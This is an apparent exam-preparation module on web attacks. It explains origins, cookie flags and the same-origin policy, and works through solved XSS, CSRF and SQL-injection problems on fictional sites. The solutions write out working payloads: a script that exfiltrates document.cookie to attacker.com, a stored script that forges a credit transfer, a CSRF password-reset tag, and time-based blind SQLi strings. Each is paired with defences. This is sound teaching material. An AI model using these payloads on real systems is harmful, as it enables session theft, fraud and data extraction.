name: Web attack construction: XSS, CSRF, SQLi with origin/cookie reasoning
theory_paragraphs: Start from zero. When you visit a website, your \term{browser} sends an \term{HTTP request} to the web server, and the server answers with an \term{HTTP response} containing a page written in HTML. Two request types matter:\begin{tightitem}\item a \term{GET} request fetches a page and puts its parameters visibly in the URL after a question mark, e.g. \texttt{/home?msg=hello};\item a \term{POST} request carries its parameters in the request body and is used for actions that change state (logging in, transferring money, making a post).\end{tightitem}Pages may contain \term{JavaScript}: small programs the browser executes automatically when it displays the page. JavaScript can read and rewrite the page it sits in -- the in-memory form of the page is called the \term{DOM} (Document Object Model) -- and can fire off further HTTP requests in the background. Almost every web-security exam question is about ONE question: which JavaScript is allowed to touch which data.

The browser's isolation rule is built on the \term{origin}: the triple $(\text{scheme}, \text{domain}, \text{port})$, e.g. $(\text{https}, \text{www.bank.com}, 443)$. The \term{Same-Origin Policy (SOP)} says JavaScript may READ data (page contents, responses to its requests, cookies via \texttt{document.cookie}) only from its own origin. Two consequences are \imp{must-remember}:\begin{tightitem}\item A script fetched from another origin (e.g. \texttt{

HTTP is stateless: without help, the server cannot tell two requests apart. \term{Cookies} fix this. After you log in, the server sends a \term{session token} in a \texttt{Set-Cookie} header; from then on the browser attaches that cookie to \imp{every} request to the site automatically -- and this automatic attachment is exactly why a forged request can arrive already \q{logged in}. Three cookie flags gate nearly every exam task:\begin{tightitem}\item \term{HttpOnly}: if true, JavaScript CANNOT read the cookie via \texttt{document.cookie}. Stealing the cookie with injected script is then impossible -- but the browser still attaches the cookie to requests, so forging ACTIONS stays possible.\item \term{Secure}: the cookie is sent only over HTTPS. Over plain HTTP a network attacker reads it on the wire no matter what.\item \term{SameSite=Strict}: the cookie is not attached to cross-site requests, which kills classic CSRF from an attacker's page.\end{tightitem}Also fix the attacker models: a \term{network attacker} sits on the wire and can read or inject traffic (HTTPS defeats this); a \term{web attacker} only controls a site like \texttt{attacker.com} and content the victim's browser is induced to load.

The three injection attacks differ in WHERE the injected content executes -- the injected content itself is called the \term{payload}, the malicious input or code the attacker plants:\begin{tightitem}\item \term{Cross-Site Scripting (XSS)}: attacker JavaScript RUNS in the victim's browser with the victim site's origin. \term{Stored XSS}: the payload is saved on the server (a post, a comment, an album title) and served to every viewer. \term{Reflected XSS}: the payload is echoed back from a request parameter, e.g. \texttt{/home?msg=X}. \term{DOM-based XSS}: client-side JavaScript insecurely writes attacker data into the page. In-origin code can do anything the user can do: read \texttt{document.cookie} (if HttpOnly=false), read secrets embedded in the page such as CSRF tokens, send authenticated requests, and \term{exfiltrate} data -- secretly send stolen values (like the cookie) out to the attacker's own server.\item \term{Cross-Site Request Forgery (CSRF)}: NO attacker JavaScript runs at all. The attacker's page -- or a stored \texttt{} or \texttt{

Defenses, matched to each attack (name them when asked \q{how to fix} or \q{why does it fail}):\begin{tightitem}\item XSS: \term{output encoding} (escape untrusted data before inserting it into a page) and \term{Content Security Policy (CSP)} (e.g. a \texttt{script-src} rule that forbids inline scripts). Blacklist filtering of \texttt{<script>} tags is fragile -- there are many other event handlers and encodings.\item CSRF: a secret per-session \term{CSRF token} embedded as a hidden form field -- the attacker's page cannot read it cross-origin, so it cannot forge a valid request -- plus \texttt{SameSite} cookies. Cookie-based authentication alone is \imp{insufficient for state-changing requests}.\item SQLi: \term{parameterized (prepared) queries} -- values travel separately from the query text, so input can never become query logic.\end{tightitem}And the famous NON-defenses: HttpOnly blocks cookie theft but \imp{not} action-forging XSS; a CSRF token blocks CSRF but \imp{not} XSS (in-origin script simply reads the token out of the page); HTTPS stops wire sniffing but not content-level attacks.
theory_cheatsheet: Origin = (scheme, domain, port). A cross-origin-loaded script runs with the LOADING page's origin; SOP blocks READING cross-origin responses but never SENDING requests; cookies attach automatically.
Cookie flags: HttpOnly=true blocks document.cookie theft (but not forged actions); Secure = HTTPS only; SameSite=Strict defeats CSRF.

XSS = attacker JS runs in the victim origin. Stored = saved on server (posts/titles); reflected = echoed URL parameter; DOM-based = client-side JS writes attacker data into the page at an insecure write point (the so-called sink).
CSRF = no attacker JS executes, just a triggered authenticated request (img/script src/auto-form). A <script src> that loads no real JS is CSRF, not XSS.
CSRF token stops CSRF (unreadable cross-origin) but not XSS (in-origin script reads it from the DOM). HTTPS stops wire attacks, not content attacks.
SQLi payloads: ' OR 1=1 -- (dump all rows), x' AND cond -- (boolean oracle), AND SLEEP(10)=1 -- (time-based blind; needs the short-circuit assumption). Fix: parameterized queries.
identify_givens: A small web application described by its endpoints and behaviors (login POST returning a session-token cookie, a page that stores user posts/comments or reflects a URL parameter, a state-changing GET/POST endpoint like follow, transfer, or resetPassword possibly guarded by a CSRF token, or a server-side SQL query built by string concatenation of a user-controlled variable), plus the attacker model (network attacker, controls attacker.com, or can only submit posts), the transport (HTTP vs HTTPS), and cookie attributes (Secure, HttpOnly, SameSite). Often a fixed menu of numbered events to order into an attack sequence.
identify_target: Produce a concrete attack achieving a stated goal: a payload plus the ordered sequence of events (post content, victim page load, attacker server response) that steals the session token, runs JavaScript in a given origin, forces an authenticated action (follow, login-as, transfer, password reset), or extracts a boolean/value from the database; and justify why it works (execution origin, SOP, cookie flags, CSRF token reachability) or which defense blocks it.
strategy_name: Match goal to injection channel, then trace origin and cookie flow

algorithm.detail: Decide what the attacker must achieve:\begin{tightitem}\item Execute JS in the victim site's origin $\Rightarrow$ \term{XSS}.\item Make the victim's browser send an authenticated request (no attacker JS needed) $\Rightarrow$ \term{CSRF}.\item Alter the server-side SQL query's logic $\Rightarrow$ \term{SQLi}.\end{tightitem}\imp{The goal, not the delivery tag, determines the class} -- a \texttt{<script src=...>} that merely triggers a request without loading real JS is CSRF, not XSS. If a cookie flag makes the stated goal impossible (e.g. token theft with HttpOnly=true), re-aim at what remains possible: forcing an action via in-origin script.

Read the givens that gate each attack:\begin{tightitem}\item HTTP + network attacker: read/inject on the wire regardless of cookie flags.\item HTTPS everywhere: wire attacks fail; switch to web-content attacks (XSS/CSRF).\item \texttt{Secure=true}: cookie sent only over HTTPS -- irrelevant under HTTPS, blocks HTTP sending.\item \texttt{HttpOnly=true}: cookie theft via \texttt{document.cookie} is blocked -- pivot to action-forging (the script needs no cookie, the browser attaches it).\item CSRF token on the state-changing endpoint: pure CSRF from the attacker's site fails (token unreadable cross-origin), but XSS can read it from the DOM.\item Stored input field (posts, titles) $\Rightarrow$ stored XSS; reflected URL parameter $\Rightarrow$ reflected XSS; string-concatenated SQL with quote-delimited literals $\Rightarrow$ SQLi.\end{tightitem}

\begin{tightitem}\item \term{XSS exfiltration} (needs HttpOnly=false): \texttt{}.\item \term{XSS action-forging}: read any needed secret from the page, then POST: \texttt{}.\item \term{CSRF}: \texttt{} or a hidden auto-submitting form -- works only if no unpredictable token is required.\item \term{SQLi}: \texttt{' OR 1=1 -- } to dump all rows; \texttt{x' AND customerName='Bob' -- } for boolean inference; append \texttt{AND SLEEP(10)=1} for time-based blind extraction.\end{tightitem}

Sequence the allowed events so prerequisites come first:\begin{tightitem}\item Victim logs in BEFORE the cookie-bearing page load.\item A malicious post/comment/title is stored BEFORE the victim visits the listing.\item For an attacker-origin script: store an \texttt{<iframe src="attacker.com">} first, then have \texttt{attacker.com} serve the \texttt{<script>}.\end{tightitem}Write one event per row with the placeholder value filled in.

State WHY it works:\begin{tightitem}\item A script executes with the origin of the page that loaded it, so a stored payload runs as the victim site's own code: it may read the DOM (including hidden CSRF tokens) and \texttt{document.cookie} if HttpOnly=false.\item SOP blocks reading cross-origin responses but never blocks sending requests, and cookies are attached automatically -- why CSRF works, why exfiltration is observable at attacker.com, and why the attacker's own site cannot learn the victim's CSRF token.\item For SQLi: the concatenated payload becomes part of the query TEXT the server parses, so \texttt{--} neutralizes the trailing quote/logic.\end{tightitem}

Note any extra assumption (e.g. \imp{SLEEP(10) must be short-circuit-evaluated only when the AND's left side is true}) and name the matching defense when asked, including defenses that do NOT help:\begin{tightitem}\item XSS: output encoding/escaping, CSP.\item CSRF: CSRF tokens, SameSite cookies -- but tokens do not stop XSS.\item SQLi: parameterized/prepared queries.\item Cookie theft via JS: HttpOnly -- but HttpOnly does not stop action-forging XSS.\item Wire attacks: HTTPS.\end{tightitem}

variations.name: Attack-class identification with T/F origin statements
variations.detail: Instead of constructing the attack, the exam shows a payload (e.g. \texttt{<script src="https://attacker.com/payload.js"></script>} in a stored post) and asks to judge statements: the script runs with the origin of the LOADING page (e.g. fakebook.com), not the origin hosting the file; SOP does not block fetching the file; cookie-stealing via a stored post is STORED XSS, not DOM-based. Trap: confusing the script's hosting origin with its execution origin, and mislabeling stored vs DOM-based.

variations.name: CSRF disguised as XSS
variations.detail: A payload like \texttt{<script src="https://fakebook.com/resetPassword?password=42"></script>} uses a script tag but loads no real JS -- it only makes the victim's browser issue the authenticated GET with cookies attached. The correct classification is CSRF. The algorithm adapts by checking whether any attacker JavaScript actually executes in the victim origin. Trap: answering \q{XSS} because of the \texttt{<script>} tag.

variations.name: Cookie/transport flag flips
variations.detail: The same session-token-theft goal is re-asked under different flags: HTTP + HttpOnly=true forces a pure network-sniffing answer (read the login response on the wire; JS cannot help); HTTPS + HttpOnly=false forces a reflected/stored XSS with \texttt{document.cookie} exfiltration; HTTPS + HttpOnly=true forces action-forging XSS instead of token theft. Traps: proposing \texttt{document.cookie} when HttpOnly=true, or proposing wire sniffing when traffic is HTTPS and the attacker is only a network attacker.

variations.name: Blind and time-based SQLi
variations.detail: After the always-true condition (\texttt{' OR 1=1 -- }: \texttt{1=1} is a condition that is always true, so every row matches) and row-count boolean variants, the output is hidden (\q{Ticket count not available}) and a timing channel is required: \texttt{x' AND customerName='Bob' AND SLEEP(10)=1 -- }, inferring the boolean from response delay. The algorithm adapts by replacing output-observation with timing-observation, and requires explicitly stating the short-circuit assumption that SLEEP runs only when the preceding AND terms are true. Trap: forgetting the assumption or leaving the string literal unterminated.

walkthrough_problem: The photo-printing shop \texttt{www.pixprint.com} lets registered users create albums. A user logs in by POSTing username and password to \texttt{/login}; on success the server sets a session-token cookie with \texttt{Secure=true} and \texttt{HttpOnly=true}. Every page served to a logged-in user embeds a per-session token in a hidden form field \texttt{<input type="hidden" name="csrf" value="...">}, and the endpoint \texttt{/transfer} accepts a POST with parameters \texttt{to}, \texttt{amount}, and \texttt{csrf}; if the \texttt{csrf} value matches the session's token, the given amount of store credit is moved from the caller's account to account \texttt{to}. The page \texttt{/albums} lists the titles of the twenty most recent albums; titles are stored on the server and displayed verbatim (no output encoding). Mallory is a registered pixprint user and also controls the web server \texttt{www.darklens.com}; she has no network access to other users' traffic. All pixprint traffic uses HTTPS. The JavaScript helper \texttt{post(url, params)}, which sends an HTTP POST request to \texttt{url} with parameters \texttt{params}, is available on every pixprint page. Goal: move 200 credits from Beatrice's account to Mallory's account. Give the payload, the sequence of events, justify why the attack works, and explain why Mallory cannot achieve the goal with a pure CSRF attack from \texttt{www.darklens.com} instead.

walkthrough_steps.work: Mallory must cause a state change -- a credit transfer -- inside Beatrice's session. That is an action-forgery goal, which points at \term{CSRF} or \term{XSS}. Beginner note: first write down what the goal is NOT. It is not \q{steal the session token}. \texttt{HttpOnly=true} makes \texttt{document.cookie} unreadable to any JavaScript, so token theft is impossible here. Do not give up: a forged action does not need the cookie VALUE at all -- the browser attaches the cookie to every pixprint request automatically. The attack only needs to make Beatrice's browser send the right request.

HTTPS plus \q{no network access to other users' traffic} rules out every wire attack, so the answer must be content-level. Now the decisive given: \texttt{/transfer} demands a \texttt{csrf} parameter that Mallory cannot know -- it is per-session and embedded only in pixprint's own pages, and the SOP forbids her site \texttt{www.darklens.com} from reading pixprint pages. So pure CSRF from her own site is dead. But album titles are stored and displayed \imp{verbatim}: that is a \term{stored XSS} channel. Script running in the pixprint origin CAN read the hidden token from the page, because it is same-origin content. Conclusion: stored XSS performing action-forgery. Beginner mistake to avoid: treating the CSRF token as a reason the goal is impossible -- it only blocks forgeries from OUTSIDE the pixprint origin.

Mallory creates an album whose title is
\[ \texttt{<script>var t=document.getElementsByName("csrf")[0].value; post("/transfer", "to=mallory,amount=200,csrf="+t)</script>} \]
Read it piece by piece: \texttt{document.getElementsByName("csrf")[0].value} pulls the hidden token out of the surrounding page (a normal same-origin DOM read, legal for any pixprint script); \texttt{post("/transfer", ...)} then sends the transfer POST with \texttt{to=mallory}, \texttt{amount=200} and the stolen token appended. Beginner note: the payload must live where it will be EXECUTED -- a stored title, not a message Mallory sends to the server API.

(1) Mallory, as a registered user, creates the album with the payload title, so the script is stored on pixprint's server. (2) Beatrice logs in via POST to \texttt{/login}; her browser stores the session cookie and every pixprint page now embeds HER per-session csrf token. Steps (1) and (2) can occur in either order, but both must precede step (3) -- a classic beginner error is having the victim load the page before logging in, when there is no cookie or token to abuse. (3) Beatrice loads \texttt{/albums}; the server embeds Mallory's stored title verbatim in the page next to Beatrice's hidden token field, and her browser parses the title as HTML and executes the \texttt{<script>}, which issues the transfer POST with cookie and token attached.

Why does it work? The script executes with the origin of the page that loaded it -- \texttt{www.pixprint.com} -- so the SOP treats it as pixprint's own code: it may read the DOM, including the hidden \texttt{csrf} input. This same-origin read is exactly what Mallory's own site is denied, which is why the injection step is indispensable. Second, the SOP never blocks SENDING requests and the browser attaches Beatrice's cookie automatically, so the POST to \texttt{/transfer} arrives authenticated AND carrying a valid token, and the server executes the transfer. Pure CSRF from \texttt{www.darklens.com} fails for one precise reason: Mallory cannot fill in the \texttt{csrf} parameter, because learning it requires a cross-origin read of a pixprint page, which the SOP blocks. \imp{A CSRF token defeats CSRF but not in-origin script}.

Assumptions to state: Beatrice visits \texttt{/albums} while logged in, and Mallory's payload album is still among the twenty most recent. Defenses: (a) output-encoding album titles (so the browser shows the \texttt{<script>} as inert text) or a CSP forbidding inline scripts removes the XSS channel entirely; (b) \texttt{HttpOnly=true} is already set and does its job -- it blocks token theft via \texttt{document.cookie} -- but this attack demonstrates it is \imp{not a defense against action-forging XSS}; (c) the CSRF token correctly blocks forgery from Mallory's own site but not from injected in-origin script. Beginner takeaway: name which defense blocks WHICH attack; examiners award points for the non-defenses as well. Final answer: the stored title \texttt{<script>var t=document.getElementsByName("csrf")[0].value; post("/transfer", "to=mallory,amount=200,csrf="+t)</script>}, delivered by store + login + load, moves 200 credits to Mallory.

exam_questions.problem: On the site \texttt{www.readbooks.com}, users submit and view posts about books. Albin is a user, initially not logged in; Malice is a network attacker between Albin and the website and controls \texttt{www.attacker.com}. Behaviors: \texttt{/home} shows all posts (same whether or not logged in); login is a POST to \texttt{/login} with \q{username,password} in the contents, and a correct login returns a session-token cookie; a logged-in user can load \texttt{/home?msg=X} to display all posts plus the message X at the top; a logged-in user can follow a user via GET \texttt{/follow?user=X}. Attacks are described as ordered events chosen from: (1) Albin loads \texttt{/home}; (2) Albin loads \texttt{/home?msg=X}; (3) Albin makes a POST request with the correct username and password; (4) Malice makes a post with contents X; (5) Malice makes \texttt{www.attacker.com} send back X; (6) Malice reads the HTTP request from Albin; (7) Malice reads the HTTP response to Albin. The helper \texttt{post(url, params)} is available. For this task assume all requests are sent over HTTPS and the session-token cookie has \texttt{Secure=true} and \texttt{HttpOnly=false}. Attack: use a reflected XSS attack to learn the value of Albin's session token.

solution_steps.work: The goal is to LEARN the session token, i.e. read a secret from Albin's browser -- that requires code running in the readbooks origin, hence \term{XSS}, and the task even mandates the reflected variant. (Compare task 4a of the same exam: over plain HTTP with \texttt{HttpOnly=true}, the only option was reading the login response on the wire -- events 3 then 7. Here HTTPS forbids exactly that.)

HTTPS blocks Malice's wire access, so wire sniffing (events 6/7) is useless. \texttt{Secure=true} is irrelevant once everything is HTTPS. The enabling given is \texttt{HttpOnly=false}: injected JavaScript MAY read \texttt{document.cookie}. The reflected channel is the \texttt{msg} parameter of \texttt{/home?msg=X}, which is echoed at the top of the page -- so a script placed in X executes when Albin loads that URL.

Use \[ \texttt{<script>post("www.attacker.com",document.cookie)</script>} \] as the value of \texttt{msg}. It reads the session cookie (allowed, HttpOnly=false) and POSTs it to Malice's server, where she simply logs the incoming request.

Attack steps:\begin{tightitem}\item 3, None -- Albin makes a POST request with the correct username and password; his browser now stores the session-token cookie.\item 2, \texttt{<script>post("www.attacker.com",document.cookie)</script>} -- Albin loads \texttt{www.readbooks.com/home?msg=<script>post("www.attacker.com",document.cookie)</script>}; the server reflects the payload into the page and his browser executes it.\end{tightitem}Login MUST come first: the cookie only exists after event 3.

The reflected script executes with the origin \texttt{www.readbooks.com} (origin of the loading page), so \texttt{document.cookie} returns Albin's session token -- HttpOnly=false permits this. Sending the token to \texttt{www.attacker.com} is a cross-origin request, but the SOP only blocks READING cross-origin responses, never SENDING requests, so the exfiltration POST goes through and Malice observes the token at her server. HTTPS protects the wire, not the content of a page the site itself reflected.

exam_questions.answer: Events: 3, None; then 2, \texttt{<script>post("www.attacker.com",document.cookie)</script>} -- the reflected script (HttpOnly=false) sends Albin's session cookie to Malice's server.

exam_questions.problem: FakeBook (\texttt{https://fakebook.com}) is a social media site whose user posts are stored on FakeBook servers. Alice and Mallory both have accounts. Mallory makes a FakeBook post with the contents \texttt{<script src="https://fakebook.com/resetPassword?password=42"></script>}. The \texttt{resetPassword} endpoint sets the currently logged-in user's password to the \texttt{password} query parameter. FakeBook does not check user inputs. When Alice opens Mallory's post, which type of attack has Mallory tried to execute? Explain how the same-origin policy allows or prevents the attack.

solution_steps.work: The goal is a state change -- Alice's password being set to \q{42} -- inside Alice's logged-in session: an action-forgery goal. Now the key check: does any attacker JavaScript actually EXECUTE in the fakebook origin? The \texttt{src} URL is the \texttt{resetPassword} endpoint; whatever it returns is not real JavaScript for the browser to run. No attacker code executes -- so despite the \texttt{<script>} tag, this is a \term{CSRF} attack, \imp{not} XSS. The delivery tag does not decide the class.

The channel is a stored post served to Alice by fakebook itself. The endpoint \texttt{resetPassword} requires no unpredictable token -- only the query parameter \texttt{password=42}, which Mallory fully controls. Nothing else gates the attack.

The tag itself is the whole payload: when Alice's browser renders Mallory's post it tries to load the \q{script} at \texttt{https://fakebook.com/resetPassword?password=42}, i.e. it issues that GET request. Order of events: Mallory stores the post; Alice is (or becomes) logged in; Alice opens the post; her browser automatically requests the \texttt{src} URL; the server processes the password reset.
The SOP does not block the attack, because the SOP never blocks SENDING requests: any page may make the browser fetch a cross-origin (or same-origin) URL via \texttt{

exam_questions.answer: CSRF: the \texttt{<script src>} tag loads no real JavaScript -- it only makes Alice's browser send the authenticated \texttt{resetPassword?password=42} request with her cookies, and the SOP never blocks sending requests.

exam_questions.problem: Kungliga Operan's ticket system uses a table \texttt{tickets(customerName, operaName, ...)}. A page takes an opera name as input, runs the query \texttt{SELECT customerName FROM tickets WHERE operaName = '\$operaName';} (directly replacing \texttt{\$operaName} with user input; single quotes delimit string literals and \texttt{--} starts a comment). After a quick code fix, the page always displays \q{Ticket count not available} instead of \q{N tickets sold} -- but the original query still runs before the message is shown. Mallory notices that when she provides \q{Carmen} as input, the website consistently takes less than 2 seconds to respond. The database supports \texttt{SLEEP(X)}, which pauses query evaluation for X seconds and then returns the number 1. Provide an input to \texttt{\$operaName} that Mallory could use to determine if Bob has a ticket for \q{Carmen}, explain how it works, and state any additional assumptions explicitly.

solution_steps.work: Mallory must extract one boolean fact -- \q{does Bob have a ticket for Carmen?} -- from the database: a \term{SQLi} goal. The output channel has been removed (the count is no longer displayed), so the boolean-inference trick of reading row counts is dead. What remains observable is TIME: the query still runs, and its duration can depend on the injected logic. This is the \term{time-based blind SQLi} variant.

The channel is unchanged: string concatenation into a single-quote-delimited literal, and \texttt{--} comments out the rest. The new observables are: (a) response time, (b) a measured baseline -- input \q{Carmen} answers in under 2 seconds -- and (c) a server-side delay primitive, \texttt{SLEEP(X)}, that returns 1 after X seconds. Beginner note: the baseline matters, because the attack works by producing a MEASURABLE difference from it.

Provide the input
\[ \texttt{Carmen' AND customerName = 'Bob' AND SLEEP(10) = 1 -- } \]
The first \texttt{Carmen'} supplies a valid opera name and closes the opened quote; the two \texttt{AND} clauses append the boolean test and the timer; the trailing \texttt{--} comments out the server's own closing quote so the query stays syntactically valid.

The server executes
\[ \texttt{SELECT customerName FROM tickets WHERE operaName = 'Carmen' AND customerName = 'Bob' AND SLEEP(10) = 1} \]
If Bob has a ticket for Carmen, a row satisfies the first two conditions, so the database evaluates \texttt{SLEEP(10)=1} and pauses 10 seconds: the page answers in about 10 seconds instead of under 2. If Bob has no such ticket, no row survives the first two conditions, the sleep is never reached, and the page answers as fast as before. The timing gap (10 s vs \(<\) 2 s) encodes the boolean.

The required additional assumption: the database uses \term{short-circuit evaluation} for \texttt{AND} -- \texttt{SLEEP(10)=1} is NOT evaluated when a left-hand conjunct is already false. Without short-circuiting, the sleep would run on every query and timing would carry no information. The injection works because the concatenated input becomes part of the query TEXT the database parses: Mallory's quote ends the intended string literal and her \texttt{--} neutralizes the trailing one. The fix (not asked, but know it): parameterized queries, so input can never become query logic.

exam_questions.answer: Input \texttt{Carmen' AND customerName = 'Bob' AND SLEEP(10) = 1 -- }: a roughly 10-second response means Bob has a ticket for Carmen, a fast (under 2 s) response means he does not -- assuming short-circuit evaluation of \texttt{AND}.
